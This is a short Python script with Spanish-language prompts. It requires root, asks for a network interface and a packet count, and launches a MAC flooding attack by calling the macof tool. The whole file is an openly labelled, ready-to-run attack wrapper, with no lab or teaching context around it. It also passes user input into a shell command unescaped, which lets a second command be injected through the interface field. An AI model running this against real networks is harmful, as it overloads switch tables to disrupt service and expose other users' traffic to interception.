#!/usr/bin/env python3
import os
import sys
import subprocess

if os.geteuid() != 0:
    print("Ejecuta con sudo")
    sys.exit(1)

interface = input("Ingrese la interfaz: ").strip() or "eth0"
packets = input("Cantidad de paquetes (default 50000): ").strip() or "50000"

print(f" Iniciando MAC Flooding ({packets} paquetes)...")
try:
    subprocess.run(f"macof -i {interface} -n {packets}", shell=True)
except KeyboardInterrupt:
    print("Ataque detenido.")
